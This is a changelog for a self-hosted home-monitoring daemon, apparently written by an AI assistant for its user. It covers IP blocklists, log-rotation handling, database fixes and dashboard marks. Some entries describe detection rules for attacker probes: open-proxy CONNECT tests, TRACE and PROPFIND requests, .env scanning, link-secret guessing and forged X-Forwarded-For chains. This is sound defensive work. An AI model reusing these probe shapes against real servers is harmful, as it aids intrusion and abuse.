like a second log line - and refuses a release where any is read as something
else, or where the crafted one is weighed against the address it names.

4.32.0 — the four ways an address goes on or off the list, and what the marks
mean.

**Only one of the four said anything.** The counting putting an address on the
list spoke; a hand putting one on, a hand taking one off, and a block whose
time simply ran out were all silent. The category says *"an address kept out,
and one let back in, by hand or when its time ran out"* - three quarters of
which never happened. All four now:

    kept out by the counting   45.9.148.9 was blocked: 5 in 10 min ...
    kept out by hand           9.9.9.9 was kept out by hand for 10 min: I do not
    let back in by hand        45.9.148.9 was let back in by hand: I know them
    its time ran out           8.8.4.4 was let back in - its time ran out

A hand taking an address off is worth saying exactly because somebody with the
PIN just opened a door, and the person who should hear is whoever is *not*
holding the phone it was done on.

**And the marks say where, not how.**

    🌐  read off the server that faces the internet - any of its six logs
    🔔  and of the notification server's in particular, beside the globe
    🏠  seen here, by this machine itself

The bell used to replace the globe, which said the wrong thing: ntfy's logs
are read off that same server. Now they are two marks, and a house means
something this machine saw itself - a press, a read, a lock - which used to
wear the same eye as a guess.

**A text now says when.** *6 min ago* is how long, not when; for the one
somebody is trying to account for, the clock time is what they are after, so
it says both.

`test/render.js` refuses a release where something off the proxy wears no
globe, where the notification server does not wear both, or where something
seen here wears a globe.

4.31.1 — the five new kinds of message, exercised rather than assumed. They
were written by reading the source and dropped in where the failure was
logged; that is how the last few faults got in, so this time each was made to
happen.

    the router will not take the list   said once, not on every retry
    a press refused                     said once per address, and a second
                                        address gets its own
    the text gateway would not send     once, and never down the text road
    the Wi-Fi controller is away        once
    a head will not take its setting    once per head

**And the half nobody had ever checked**: that choosing a road for a kind
actually sends it that way. Routing *a one-tap link* to Telegram alone gives
`ntfy: false, telegram: true`; switching *the router* off sends nothing at
all; a kind nobody has touched still takes the ordinary roads. `test/facts.py`
holds all three now - the list of kinds being right was only ever half of it.

No fault in 4.31.0 itself. One in my own checking, worth writing down: the
first run wrote the per-kind settings to the wrong place in the database and
read back "nothing is routed anywhere", which looks exactly like the feature
being broken. The rig was wrong, not the daemon - and a test that is wrong in
that direction is worse than none, because it sends you rewriting something
that works.

4.31.0 — you asked the right question. **Five of the eighteen kinds of message
were offered a road and nothing ever sent them.**

*A one-tap link*, *the router that carries the list*, *heating*, *Wi-Fi and
who is home*, *the text gateway* - all five on the card, all five routable to
ntfy or Telegram or a text, and every one of them silent since the day it was
added. Anybody who sent *a one-tap link* to their phone heard nothing for ever
and had no way to tell whether that meant all was well.

The things they describe were happening; they were going into the log and the
events and no further. Now:

    taps      a press refused - the wrong secret, the wrong code, a push
              somebody said no to. Deduped on the address, since a script
              trying one link is one thing happening, not fifty.
    router    the router will not take the list. Said once, not every minute:
              while it is out of step the house still refuses these addresses
              itself, but nothing else on the network is.
    heating   a head that has been told the same thing three times and still
              says otherwise, so it is left alone.
    wifi      the controller cannot be reached, so who is home is not being
              followed - and anything waiting on somebody being home waits
              for ever without saying so.
    gateway   a text that would not go. Down the other roads and never by
              text, which is the road that just failed, and once an hour.

**And nothing is sent that the card cannot route.** The two that look like
exceptions - a device's own alert and a written message of yours - carry their
own three switches by design, which is why they are not kinds on that card.

`test/facts.py` now refuses a release where the card offers a road for
something nothing sends, or where something is sent that the card offers no
road for. Eighteen kinds, every one of them both sent and routable.

4.30.0 — **deploy/ntfy.logrotate**, and the reading taught to cope with what
it does.

Both of ntfy's own files grow for ever and nothing shortens them - yours is
already 204 kB of log and a ban feed that only ever gains lines. The rotate
file is three choices deep, and each is deliberate:

**copytruncate**, because ntfy holds both files open and is never told to
reopen them: move one and it carries on writing to a file with no name while
the new one stays empty for ever. So the file is copied and then emptied in
place. **delaycompress**, because the house reads the most recent copy with
tail and cannot read a gzip. **su ntfy ntfy**, because /var/lib/ntfy is
drwxr-x--- and logrotate cannot see into it as anybody else.

**And the reading had three faults against exactly this.** With copytruncate
there is no new inode to notice - only "smaller than where I was" - and:

    the copy beside it was drained a second time on the next reading
    a .gz copy would have been tailed as binary
    after a rotation with nothing yet in the new file, the old offset stood,
      so the first lines written after it looked like lines already read

All three are fixed, and the whole dance is checked step by step: ten lines
read, one written before the copy and one after it both read exactly once,
nothing read twice, a line written after an empty rotation read, and a
compressed copy passed over.

The upgrade's list carries the entry, so anybody on an older version is told
the file is there.

4.29.0 — **ntfy writes a log of its own again**, and this time on purpose.

4.8.3 took `log-file` out because naming one in a directory ntfy cannot write
is fatal at startup and says nothing useful while it fails. That was the right
fix for the crash and the wrong conclusion: the house *reads* that file -
*And ntfy's own two files* -> *Its own log* - and without it the only thing
weighed from ntfy is what nginx saw.

    log-file: "/var/lib/ntfy/ntfy.log"

In `/var/lib/ntfy`, which is the ntfy user's own ground, with the one command
that makes sure of it and a logrotate block beside it in the comment -
`copytruncate`, because ntfy holds the file open and is never told to reopen
it. journald still has everything as well; this is the copy something else can
read.

`test/nginx.py` refuses a release where the packaged config writes no log of
its own, and the upgrade's list of what changed in deploy/ carries the entry,
so an upgrade from anything older says so.

4.28.2 — **a KeyError waiting in the middle of every log sweep.**

`country_says` remembers what it has looked up, and emptied that memory when
it reached four thousand addresses - then read the answer it had just put in
it, on the very next line. Every four thousandth address threw, and where it
threw is the worst part: in the middle of weighing a log, which is exactly
where nobody is watching. A busy day is four thousand addresses.

The one just looked up is kept. And the same memory for the lists had the
opposite fault - it was never emptied at all, one entry per address ever seen,
which is a leak nobody would notice until the machine ran out of months
later. Both are held to four thousand now, and asking again costs seventeen
microseconds.

    nine thousand addresses through both
    the lists memory holds     1,000
    the country memory holds   1,000
    and both still answer      probe  XX

What was hunted and came back clean: every function that takes an address,
given an empty string, a None, a three-hundred-character name, a path
traversal and an embedded newline - none of the five throws. `range_of` and
`pack_address` on eight kinds of rubbish - neither throws. A log line with a
two-megabyte path - weighed in 7 ms, and what is kept of it is capped at two
hundred characters everywhere it is written down. Four threads weighing at
once, eight hundred lines - no fault.

`test/taps.py` puts nine thousand addresses through both memories and refuses
a release where either grows without end or stops answering when it is
emptied.

4.28.1 — two ways yesterday's rebuild could have gone wrong, found by asking
what happens if it is interrupted.

**Killed part way through, the readings would have been orphaned.** The
rebuild copies into `samples_slim`, drops `samples`, renames. Killed between
the drop and the rename - a restart, a power cut, an OOM - the next start
writes the schema first, which makes an empty `samples` again, and the real
readings sit in `samples_slim` with nothing reading them. The house would have
come up with no history and nothing saying why. Whatever is in a half-built
table is brought back now, and it says so:

    a rebuild of the readings table had been left half done; 1,794,951 row(s) brought back

Tried both ways it can break - killed before the rename and killed after - and
neither loses a row.

**And VACUUM needs the disk twice over.** It writes a whole second copy before
it puts the first away; on a disk with less than that free it fails and the
file is left as it was. The rebuild is worth doing either way, so it is done
first, and the tidying is skipped with a word about it rather than attempted
and failed: *the readings table was rebuilt, but there is not room to tidy the
file afterwards (310 MB free, 590 MB wanted)*.

`test/tables.py` builds a half-done database both ways and refuses a release
where either loses rows, leaves the half-built table behind, or comes up still
storing everything twice.

4.28.0 — your database read, and **the readings were being stored twice**.

280 MB, and where it goes:

    samples                     94 MB
    sqlite_autoindex_samples    88 MB   <- the same readings, again
    geo_ranges                  24 MB
    samples_ts                  23 MB
    geo_ranges_lo               16 MB

`samples` is keyed on (device, key, ts), and as an ordinary table SQLite keeps
the whole of it a second time in the index that enforces that key. **WITHOUT
ROWID makes the table BE that index** - one copy. And `samples_ts`, the index
on the timestamp alone, cost 23 MB to save six milliseconds on one query a
night.

    your database, as it is      268 MB
    after                        147 MB      same rows, same queries
    a chart                      0.08 ms
    the newest reading           0.005 ms

It happens once, on the first start after the upgrade, before anything else
runs - five seconds for your 1.79 million rows - and is logged while it does.
A house starting fresh gets the table that way from the beginning.

While reading it: all twelve addresses kept out right now came from the lists,
every one for good, and the lists themselves hold 91,091 ranges against
717,170 countries. The presses, the taps and the events are all where they
should be.

`test/tables.py` refuses a release where the readings table is not its own
index, where the ts index is back, or where a database written the old way is
left as it was on opening - and checks the rebuild keeps every row and every
value.

4.27.1 — you are right, and 4.27.0 had it backwards. Diffing your config
against the packaged one tells you what **you** changed, which you already
know, and it would say so on every upgrade for ever - which teaches somebody
to skip the message, and then the one that matters goes past unread.

So it says what **we** changed, since the version that was running:

    == What changed in deploy/ since the version you were running
      !!   ntfy-server.yml - upstream-base-url, without which an iPhone is never woken
           packaged: .../deploy/ntfy-server.yml
           yours:    /etc/ntfy/server.yml
      !!   nginx-ntfy-front.conf - a rate limit, a limit on methods, and a body limit

and nothing at all when nothing has changed:

      ok   nothing in deploy/ has changed since 4.26.1

The list is kept by hand in `install.sh`, one line per release that touched
deploy/ - version, file, and what changed in a few words. Eight entries so
far, from 4.6.2 onward. `test/nginx.py` refuses a release where the list names
a file that is not in deploy/, or mentions a version that does not exist yet.

4.27.0 — **an upgrade now says which of the packaged deploy files no longer
match what is on the machine**, and where to look.

An upgrade deliberately never writes over a config a running house has edited:
its own addresses, its own allow rules, its own certificates. That is right,
and it has a cost - a change shipped in `deploy/` sits unnoticed for months.
So after every `--upgrade`, each file in `deploy/` is compared with the thing
on this machine that is made from it:

    == What the packaged files say against what is on this machine
      ok   zigmon.service -> /etc/systemd/system/zigmon.service is the same
      !!   nginx-tap-front.conf -> /etc/nginx/conf.d/zigmon-tap.conf DIFFERS:
           the package has 24 line(s) yours has not, yours has 3 the package has not
           look:  diff -u /etc/nginx/conf.d/zigmon-tap.conf .../deploy/nginx-tap-front.conf
           (expected where you have put in your own names, addresses or certificates)
      !!   ntfy-server.yml -> /etc/ntfy/server.yml is not there at all

with the line count each way and the exact `diff -u` to run. A file this
machine makes nothing from says so rather than being counted as a difference,
and `config.json` says plainly that it is your settings and not a copy.

`zigmon.service` is the one file an upgrade does write, so a difference there
after one means the write failed rather than that you edited it, and it says
that instead.

`test/nginx.py` refuses a release where the report is missing, where an
upgrade does not call it, or where it does not know where one of the seven
deploy files lives.

4.26.1 — a pass over the whole of it: the code, the API surface, and the
latency with everything switched on.

**One road acted without the PIN.** `/api/plug/mqtt-test` publishes to the
broker and waits for the box to answer - a thing that acts - and it answered
anybody holding the page's token, which every browser on the house's network
has. It asks now, like everything else that acts. `/api/lock` still does not,
and should not: taking your own key away is not an act anybody needs
protecting from.

`test/endpoints.py` now asks the running daemon rather than reading the
source: every POST road, with no PIN, must be refused. **140 roads, every one
of them behind the PIN.**

**Nothing leaks into what a browser is told.** The MQTT password, the Duo key
and the proxy password are all set in the daemon and none of the three appears
anywhere in the 24 kB of status a browser is given.

**The SQL is safe.** Thirteen statements are built by formatting a table name
into them; every one of those names comes from a literal tuple in the source -
`('samples', 'samples_hourly', 'events', 'snapshots')` - and never from
anything a caller can reach. No bare excepts, no mutable default arguments.

**Latency, on the real database with three lists (42,765 ranges), the country
list (199,000) and thirty blocked addresses:**

    status()           8.7 ms      blocked_list()     1.0 ms
    anomaly_state()    0.00 ms     address_story()    0.06 ms
    weighing a whole day of logs (3,344 lines)   256 ms, 0.076 ms a line
    the longest anything else waited for the database while that ran:  8 ms

4.26.0 — the logs read once more, this time for what the **presses that
worked** say, since everything else on that card is about strangers being
refused.

Nineteen presses worked in the day. Eighteen came from one address. **One
came from another** - 37.48.19.38, a different build of the Shortcuts app -
and nothing said so. That one is either the phone on a new network or
somebody else holding the link, and the person to decide is the owner, now,
not somebody reading a log next week.

So a press that works from an address no link has ever been pressed from is
said out loud, once per address:

    The link "Osoby" was pressed, and worked, from 37.48.19.38 - an address
    no link has been pressed from before. If that is not you, the link's
    secret has walked: rotate it under Control → Public API.

Never for a refusal - a stranger being refused is what the rest of the card is
for - and never for one of the house's own addresses. The very first press of
all is not said, since there is nothing to compare it to.

What else the reading found, and left alone on purpose: the user agents.
Twelve hundred refused requests claimed to be Windows Chrome and a hundred and
fifty claimed to be Googlebot; scanners lie about that in both directions, so
weighing it would catch the honest ones and none of the others. And the ntfy
rate limit fired a hundred and forty-two times against one address scanning
that name for `.env` files - which is the address in ntfy's own ban feed, and
which the house already weighs from both.

`test/taps.py` presses a link from two addresses five times and refuses a
release where the new one is said more or less than once, or where a refusal
or the house is said as somewhere new.

4.25.0 — a day of a real server read line by line, and **three things that
were being weighed as ordinary refusals when they are not**.

**Being asked to connect somewhere else.** Five addresses did this:

    CONNECT 1.1.1.1:80              CONNECT checkip.amazonaws.com:443
    CONNECT api64.ipify.org:443     CONNECT icanhazip.com:443
    SSTP_DUPLEX_POST /sra_{BA195980-...}

That is somebody testing whether this server is an open proxy, on the way to
using it for whatever they do next in somebody else's logs. A browser never
asks a server that is not its proxy to connect anywhere. It weighs 8, so two
of them are a block.

**Methods nobody uses on purpose**: TRACE and TRACK, which ask a server to
echo a request back and are how a cross-site script reads a cookie it may not
read; PROPFIND, looking for a WebDAV share; PRI, the plain-HTTP/2 handshake;
DEBUG, a Visual Studio leftover that answers on some servers. Seventeen of
them in the day, from seven addresses. They weigh 4, where a plain 405 weighs
1.

**And somebody guessing link secrets.** A hundred and eleven requests to
`/tap/<something>` - ninety-four to one shape, seventeen to `/tap/aa`. The
road is real and the secret is not: that is the one thing this house has that
is worth guessing, and it now weighs 5 rather than being counted with every
other path that is not there.

What the day was made of, after: 1,014 paths that are not there, 170 asking
for the machine by address, 147 knocks at the door, 23 pieces of not-HTTP, 7
odd methods, 6 open-proxy tries, 1 guessed secret. 141 addresses weighed, 23
kept out, and the presses that worked weighed nothing at all.

`test/taps.py` puts eight of these shapes through and refuses a release where
any is read as something else, kept out when it should not be, or let by when
it should not be.

4.24.0 — **four more lists**, each fetched here and counted before being
offered, and a lookup that stayed fast when they went in.

    IPsum (3 lists or more)   18,924   public domain, rebuilt daily
    IPsum (5 lists or more)    4,835   the same, where five agree
    FireHOL level 2           19,157   caught attacking somebody in 48 h
    FireHOL level 3           12,986   the last month of the same

**IPsum is the one worth adding second.** It gathers thirty-odd public lists
and publishes an address only when several of them agree - one list calling an
address bad is an opinion, three agreeing is close to a fact. The three-list
set is nineteen thousand addresses; the five-list set is five thousand and
harder to argue with. Using both is the same as using the five-list one, so
pick.

**FireHOL 2 and 3 are the first of these where a false positive is possible at
all**, and the card says so: a house on a dynamic address that somebody abused
yesterday can be on level 2, and level 3 is a month of that. With `feeds_ban`
on, being on a list and knocking once is a permanent block - so add those two
only if you would rather refuse a stranger than let one through.

**And the lookup would have been ruined by them.** It asked for every range
whose start is below the address: four microseconds with one list in, **1.5
milliseconds with five** - and it runs for every line of every log, so a
day of logs would have taken five seconds of nothing but this. Nothing wider
than a /8 is ever taken from a list, so only ranges starting within that much
of the address can contain it; that turns the scan into a seek.

    one list in, before   0.004 ms
    five lists in, before 1.523 ms
    five lists in, after  0.017 ms      60,586 ranges held

`test/taps.py` puts twenty thousand ranges in and refuses a release where a
lookup takes longer than half a millisecond, and checks six addresses in and
out of ranges of both families so the faster query still answers the same.

4.23.2 — **the marks line up.** A row wears between one and five of them - a
hand or a robot or a dove, a globe or a bell, the router's shield, the book, a
flag - and they were simply appended, so the address began at a different
place on every line and a page of them read like a ragged edge.

Each mark has a slot of its own now, always there and empty when it does not
apply, with the flag last in a column of its own:

    [🤖 ·  ·  📕] US   65.49.1.106
    [🤖 🌐 🛡️ 📕] DE   213.209.159.133
    [✋ ·  ·  · ] --   1.1.1.1
    [🕊️ ·  ·  · ] CZ   192.168.40.5

Four slots and a flag on every row, whatever it happens to carry.

`test/render.js` counts the slots on every blocked row and refuses a release
where two rows have a different number - which is the fault, stated as a rule.

One more thing while there: two checks in that walk were reading titles in the
moment between two of the page's slow sweeps, so they failed for the timing
rather than for a fault. They sweep first now, and three runs in a row pass.

4.23.1 — a second reading of the detection for faults, and two that matter.

**A caller could choose which address got the blame.** X-Forwarded-For is a
chain, and a proxy *appends* the address it saw to whatever the caller already
sent. The house was reading the front of that chain - so a caller who sent the
header himself put whatever he liked there, and that is the address that was
weighed and kept out. The house's own phone, say, while he carried on. And
rubbish in the header became a "caller" that was never an address and could
never be kept out. The chain is read from the right now, past every proxy we
trust, taking the first thing that is an address at all; failing that, the
peer:

    peer 192.168.43.17  XFF "1.2.3.4, 89.24.57.142"  -> 89.24.57.142
    peer 5.5.5.5        XFF "1.2.3.4"                -> 5.5.5.5
    peer 192.168.43.17  XFF "not-an-address"         -> 192.168.43.17

**A fetched list could contain the whole internet.** One line of `0.0.0.0/0`
in a list - a mistake at their end, or not - would make every address
"listed", and with a listed address kept out for good on its first knock, that
is every stranger kept out for good on their first refused press. Nothing
wider than a /8 (IPv4) or a /16 (IPv6) is taken from a list now; the bogons
are /8 and nothing real is wider. A list of more than four hundred thousand
ranges is refused whole, as not a list anybody curated.

Also checked and found sound: an IPv6 caller in a log is weighed and kept out
like any other; a path crafted to look like a second log line stays one line,
because nginx escapes the quote and the newline before writing it.

`test/taps.py` checks six shapes of the forwarded chain and refuses a release
where any of them is read wrong, and refuses one where `0.0.0.0/0` or `::/0`
is taken from a list.

4.23.0 — a reading of the whole of the blocking against six real logs, two of
them rotated copies, and the two faults it found.

**The last minutes of every day went unread.** When logrotate moves a log
aside at midnight, whatever was written between the last reading and the move
is in the rotated copy - `zigmon-tap.log-20260917` - and not in the new file.
The reader saw the new file was smaller than where it had got to and started
over, and the tail of yesterday was never read. It reads the rotated copy from
where it stopped first now, then starts the new file:

    two lines written before the rotation, one after -> all three read

While doing that, the three readers - access log, error log, and the four
ntfy files - became one, so a rotation is handled once rather than three
slightly different ways.

**A hundred and sixty `connect() failed ... upstream` lines were nobody's fault
but ours, and nobody was told.** Those lines are rightly not weighed - the
caller did nothing wrong - but a hundred and sixty of them in a row means the
notification server behind nginx was down, and that was left to be found in a
log. It is a message now, once an hour at most: *the notification server is
not answering: the server in front could not reach http://127.0.0.1:2586 160
time(s)*. Same for the dashboard's own upstream.

Read end to end on the six files: 3,347 tap lines with none unread, every
status accounted for, 125 addresses weighed, 21 kept out. The heaviest address
on the counters is one of the house's own - 192.168.40.10, forty-one points of
bytes that are not HTTP - which the house rule keeps at three times the bar;
worth a look at what on that machine is talking to the proxy that way. Latency
with the lists, the countries and thirty blocked rows all in: status 1.6 ms,
the blocked list 0.6 ms, a lookup 4 µs.

`test/taps.py` rotates a stand-in log underneath the reader and refuses a
release where the lines before the rotation are lost, and checks that our own
server being down is said once and weighed against nobody.

4.22.1 — **every mark on the Public API tab answers the pointer**, and this
time it was checked against every kind of row the tab can draw at once rather
than the ones that happened to be showing.

The story table was the gap: its state cell was built as one string - *⛔
blocked 🌐 📕* - and one string cannot explain itself in pieces. Each mark is
a span of its own now, with the same words the rows above use, so the pointer
finds the same answer whichever list it is over. The *by* column the same.
Three more were silent on the blocked rows: the hand, the robot and the dove,
and the router's shield still spoke through the browser's own box.

`test/render.js` now fills the tab with a waiting press, three finished ones,
three kinds of blocked row, a counter and three kinds of story row, opens both
folds, and refuses a release where any mark on the tab - state, place, list,
country, router, who - says nothing to the pointer. Thirty-five marks, none
silent.

4.22.0 — **real flags, served from this house, no internet needed.**

The advice you were given is right about the shape and wrong about where the
pictures come from: a CDN is a request to somebody else's server for every
page load, and a dashboard that does not work without it is a dashboard that
does not work in the one situation it is most needed. So the pictures live
here.

`web/flags/` holds the flag-icons set - 256 countries as small SVGs, 2.4 MB in
all, under its MIT licence, which travels with them. The badge beside an
address is now the picture and the two letters together:

    [🇨🇿 CZ]  [🇩🇪 DE]  [🇺🇸 US]  [🇳🇱 NL]

drawn from a file on your own server, so it looks the same on Windows, on the
iPad and on the phone, and it is there when the internet is not. If a picture
ever fails to load, the letters stand alone. The home nginx already serves the
directory and the page's content-security policy already allows it - nothing
in either changed. `install.sh` puts the set in place.

`test/version.py` refuses a release where the set or its licence is missing;
`test/render.js` refuses one where a badge carries no picture or fetches it
from anywhere but this house.

4.21.2 — the five **Incorrect use of `<label for=...>`** issues were ours and
are gone.

A label's `for` must name a form element. Two of ours named the span a switch
is drawn into, and three named an id that is on nothing at all - the switch
beside them lives in `<id>-sw`. The browser cannot tie those together: clicking
the word did nothing, and a screen reader read the label and the switch as two
unrelated things.

The labels carry an id now and the switches say `aria-labelledby`, which is
what that is for. Eight switches say what labels them, and no label points at
anything that is not a field.

`test/render.js` walks every card and every tab and refuses a release where a
label points at something that is not a form field - which is the rule Chrome
was applying.

**The console error is not ours.** *A listener indicated an asynchronous
response by returning true, but the message channel closed before a response
was received* is a Chrome extension talking to itself: an extension's content
script returns `true` from `onMessage` to say it will answer later, and then
the page it was on goes away. Nothing in zigmon uses `chrome.runtime` or any
message channel. Try the page in an incognito window with extensions off and
it will not appear.

4.21.1 — **the router sheet has a box and the countries beside the
addresses.** A router carrying a few hundred of them is a sheet nobody can
read.

The same filter as everywhere else: every word has to be somewhere in the card
- the address, the country, which list knew it, the reason, the ladder step,
or what it actually asked for. So `firehol1` narrows it to that list, `us` to
that country, and `robots` to whoever asked for robots.txt:

    "firehol1"   1 of 3 shown
    "us"         1 of 3 shown
    "robots"     1 of 3 shown
    "nonsense"   Nothing on the router matches that.

The country badge sits beside each address, the same one the lists and the
story use.

`test/render.js` types into the sheet's box and refuses a release where it is
missing, where a filter matching nothing still shows cards, where clearing it
does not bring them back, or where an address on it says no country.

4.21.0 — **two folds instead of one**, and the country finally in a column.

    ▸ Blacklisted IPs      3 address(es)
    ▸ Blocked by system    2 address(es)

Every kept-out address is in one of them: what somebody else's list already
knew, and what this house decided about on its own. Both are shut to begin
with, both have the same bar - a box that filters on the address, the list,
the country, the reason or the ladder step, and pages of twenty-five - and
both hold exactly the rows they always did.

**And the country has a column of its own** in the story table. It was being
tacked on to the cell that says *blocked* or *let back in*, and that text is a
different width on every row, so the badges wandered - which is what your red
line was tracing. Six headings, six cells, everything under everything.

`test/render.js` checks there are two folds, that each has a box to filter it
with, that nothing is left loose on the card, and that the story table's
headings and cells count the same.

4.20.5 — **one kind of explanation, everywhere.** You were getting two at
once: the page's own dark panel and, on top of it, the browser's white box
saying the same thing in a different face.

Three reasons, all mine. `explain()` **kept** the title after taking the words
from it, so both appeared. The sweep only converted titles of fifty-five
characters or more, so every short one stayed the browser's. And an element
explained once was handed a title again by the next redraw - six of them lived
there, a second apart, for ever.

The title is taken away now wherever the page explains something, the sweep
converts **every** title however short, the watcher notices a title being set
on an element that was already there, and a slow sweep every four seconds
catches whatever is set in the same breath as a redraw. On a walk through
every card: **484 elements explain themselves, none carries the browser's
box**.

What a screen reader hears is kept: the words go into `aria-label`, and the
original title into `data-said` where the page's own markup still shows it.

`test/render.js` refuses a release where any element still carries a tooltip
of the browser's, where the sweep reaches fewer than a hundred elements, or
where taking a title away left nothing for a screen reader.

4.20.4 — **every mark in the Public API section answers the pointer**, in the
same words the rest of the page uses. A mark nobody can read is a mark that
has to be asked about.

    ⏳  Waiting for somebody to say yes or no. Nothing has happened yet,
        and it will give up on its own when the time runs out.
    ✅  Approved, and the thing it asked for was done.
    💬  It sent you a message rather than changing anything.
    👁️  Asked for and answered, and changed nothing: somebody looked.
    ⛔  Refused. Either somebody said no, or what it carried was not right.
    ✋  Stopped by hand before it finished.
    ⌛  Nobody answered in time, so it gave up. Nothing was done.

And the columns beside them: **Duo** and **a code** each say what a press had
to get past and what that means, and **by a header** says the secret travelled
where no log keeps it while **by its address** says the opposite and where to
shut that form off.

While in there, the road was being drawn into the table twice - once plain and
once with its words - so it is drawn once.

`test/render.js` puts a waiting press and two finished ones through that
section and refuses a release where any mark in it says nothing to the
pointer.

4.20.3 — the marks were put on the wrong list of rows. There are three
renderers that draw an address - the ones being watched, the ones kept out,
and the history - and the book and the country went on to the first while you
were looking at the second. `assert count == 1` on the text I was replacing
passed every time, because the line is written slightly differently in each of
them.

Now, on a row that is kept out:

    🤖 🛡️ 📕 [DE]  77.90.185.226
    🤖 ⚠️ 📕 [US]  3.22.187.122
                   📕 on 2 lists: blocklist_de, firehol1
    🤖      [CZ]  89.24.9.9        (on no list, so no book)

Also: the fold is called **Blacklisted IPs**; there is air between its filter
and the first row under it; **Every press, and what came of it** carries the
country beside the address it was asked from; and the country is asked for
again every minute rather than decided once - a daemon that asked before the
list was fetched said nobody had a country until it was restarted.

`test/render.js` checks a blocked row wears the book and the country, and that
the fold is called what it holds.

About the flags themselves, plainly: **these are two-letter badges, not
pictures**. Windows has no flag glyphs, so an emoji flag is drawn there as the
two letters it is made of - which is what you were seeing. Real pictures mean
fetching an image per country from somebody else's server, which is a thing
this dashboard has never done and which I am not going to add without you
saying you want it. Say the word and it is a small change.

4.20.2 — **searching the story for something that is not there took the search
box with it.** One line did it:

    if (!old.length) return;

An empty answer emptied the whole section - the heading, the box, everything -
so you were left looking at a blank card with no way to clear what you had
typed. The one moment the box is most needed is the moment it disappeared.

It draws the heading and the box whenever anything is being searched for, and
says so plainly underneath: *Nothing recorded matches that. Clear the box to
see everything again.* What was typed stays in the box. A house that has never
kept anybody out still draws nothing at all, because there is nothing to
search.

`test/render.js` types something that matches nothing and refuses a release
where the box goes away, forgets what was typed, or says nothing.

4.20.1 — **the lists were never fetched by themselves**, and the reason is the
same shape as the last two: the thing was written and nothing called it.

`feeds_due` and `geo_due` existed, knew exactly when each list was next owed,
and no line of the clock ever reached them. So a house with four lists
switched on and *every hour* asked for sat with whatever it had fetched by
hand - yours said 2 h 35 min and would have said it tomorrow. They are called
from the minute loop now, on a thread of their own because each is a download.

    never fetched   -> firehol1, geo
    just fetched    -> nothing, as it should be
    two hours old, asked for hourly -> firehol1

`test/taps.py` checks all three of those, and then reads zigmon.py and refuses
a release where the clock does not name them. That last line is the one that
matters: three times now I have written something and left it uncalled, and a
test that only exercises the function directly cannot see it.

While in there, every setting the card can change was checked against whether
anything reads it. All of the newest fifteen do, in the place they should -
`feeds_weight` in the weighing, `feeds_ban` where a block is decided,
`proxy_spread_bar` where a sweep is looked for, the six ntfy paths in the
sweep. Twelve older ones are read by a name built at the time
(`silent_after_` + the kind of device) or by the page rather than the daemon,
which is why a plain search does not find them.

4.20.0 — **a fold for the ones a list already knew**, and a country badge that
looks the same on every machine.

**The badge first**, because it explains your screenshot: Windows draws a flag
emoji as the two letters it is made of, which is why NL and cz turned up where
flags were meant to be, while the iPad drew them properly. A thing that looks
different on every machine is worse than a plain one that looks the same, so
it is a badge of our own now - two letters, boxed, in a column of its own so
the rows line up whether or not an address has a country at all, with the
country's name and what it is for under the pointer.

Every mark on those rows answers to the pointer that way now, in the same
words as everything else on the page: what the globe, the bell, the eye and
the book each mean.

**And the fold.** Addresses somebody else's list already knew go into a
section of their own, **shut to begin with** - there will be a great many of
them in time, and a long list of them buries the handful that are here for
what they did *here*.

    ▸ On a list somebody else keeps        60 address(es)

Opened, it holds the same rows with everything they always had, a box that
filters on the address, the list, the country, the reason or the ladder step,
and pages of twenty-five. A row on more than one list says so: **📕 on 2
lists: blocklist_de, firehol1** - two lists agreeing about an address says
more than one does.

`test/render.js` puts sixty listed addresses and one ordinary one through it
and checks that only the ordinary one is loose, that the fold starts shut, and
that filtering and paging inside it do what they say.

4.19.5 — three faults you could see in one screenshot.

**The box said `ask about one address \u2014 45.9.148.9`** in so many letters.
An HTML attribute is not JavaScript: an escape written there is five
characters of nonsense, not a dash. Both boxes carry the character itself now,
and `test/render.js` refuses a release where an escape is shown to anybody in
a placeholder or a tooltip.

**No flags anywhere**, even with seven hundred thousand ranges fetched. The
looking-up was gated on the switch, and the switch says whether to go and
*fetch* the list - so a house that had fetched one and then left the switch
off drew nothing and said nothing about why. What is in hand is shown; the
switch only decides whether to go and get it.

**And the history table had neither.** The rows above it carry the country and
which list knew an address; the story underneath came from a different road
that never went near either. It carries both now, so a row reads the same
wherever it appears.

4.19.4 — **fetching the country list stopped the house**, and that one is
mine.

Seven hundred thousand ranges went into the database in a single transaction,
holding the only lock it has for as long as it took to write them. Everything
else queued behind it: the status the page asks for twice a second, the
charts, the writing down of readings. The card appeared to hang because it
was.

Two fixes. The rows go in **in thousands, with the lock let go between them** -
a little slower in all, and nothing else notices it happening. And the whole
fetch - a few megabytes to download, unpack and parse - now runs **on a thread
of its own**, so the button comes back at once and the card says how it went
when it is done. Pressing it twice while it is working is refused rather than
started twice.

    120,000 rows written in 1.8 s
    the longest anything else waited for the database: 0 ms

`test/tables.py` writes sixty thousand ranges while another thread asks the
database something every five milliseconds, and refuses a release where any of
those questions waits as long as a second.

4.19.3 — the shield was already taken. 🛡️ means the router is carrying an
address; I put a second meaning on it for a list somebody else keeps, and a
mark that means two things is worse than no mark at all - it becomes a mark
that has to be asked about.

A list is a register somebody else keeps, so it gets **📕**:

    🌐 seen at the server in front      🔔 seen at the notification server
    👁️ seen here                        🛡️ the router is carrying it
    📕 on the firehol1 list             🇨🇿 the country it is in

Six marks, six meanings, no two the same. `test/render.js` refuses a release
where a list is marked with the shield.

4.19.2 — three things you spotted, and an honest answer to the fourth.

**The country list had no button.** The road to fetch it was there and nothing
pressed it; it waited for the month to come round. *The country list itself*
now sits beside the switch and the interval, says how many ranges are held and
when they came, and has *Fetch it now* on it.

**And the boxes typed into looked wrong** - the one for asking about an
address, the Wi-Fi filter, and the one for blocking an address by hand were
all bare `<input>`s in a button row, so the browser drew them: a white
rectangle on a dark card, a different height from the button beside them. Any
box in a button row now wears the same face as every other box on the page -
the card's panel colour, the same border and corner, the same height, and the
accent when it has the cursor.

**The flags, and where they are not.** They are beside every address on the
blocked list, on the counters of what an address has been doing, in the story
of an address on the router sheet, and in the answer the asking box gives.
They are **not** in the press log or on the public-address card - those draw
addresses by other paths that do not go near the country list yet. Say the
word and they get them; I am not going to claim they are there.

4.19.1 — **a filter over everything ever heard on the air.** Open the history
under *Other networks on the air* and there is a box above it: type, and the
list narrows as you go.

What is typed is matched against the whole of a row - the name, the BSSID, the
band, the channel, how it is locked, whether it is a Ubiquiti point, the best
reading it ever gave - **in any order and without anybody having to get the
capitals right**. Several words all have to be there, so `wpa2 2.4` is the
WPA2 networks on that band and `de:ad` is one maker's:

    nothing typed    4
    "upc"            1 of 4 shown
